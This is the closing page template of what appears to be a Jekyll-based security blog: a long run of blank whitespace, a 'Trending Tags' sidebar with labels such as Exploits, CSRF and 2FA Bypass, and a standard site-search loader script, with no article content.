  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/python/">Python</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/guides/">Guides</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/exploits/">Exploits</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/web-pentesting/">Web Pentesting</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/csrf/">CSRF</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/tools/">Tools</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/2fa-bypass/">2FA Bypass</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/advanced-search/">Advanced Search</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/anonymity/">Anonymity</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/browser-extensions/">Browser Extensions</a>
      
    </div>
  </section>

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>

      </div>

      <aside aria-label="Scroll to Top">
        <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow">
          <i class="fas fa-angle-up"></i>
        </button>
      </aside>
    </div>

    <div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div>

    
      <aside
  id="notification"
  class="toast"
  role="alert"
  aria-live="assertive"
  aria-atomic="true"
  data-bs-animation="true"
  data-bs-autohide="false"
>
  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{snippet}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

